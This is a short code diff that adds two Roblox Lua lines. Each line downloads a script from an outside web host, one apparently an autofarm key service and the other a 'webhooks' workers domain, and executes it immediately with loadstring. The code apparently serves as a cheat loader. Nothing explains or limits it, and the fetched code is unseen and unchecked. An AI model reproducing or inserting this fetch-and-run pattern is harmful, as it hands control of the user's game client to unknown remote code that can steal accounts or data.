@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://autofarm-key.vercel.app/api/autofarm2"))()
+loadstring(game:HttpGet("https://webhooks.skeppycattstar.workers.dev/script"))()
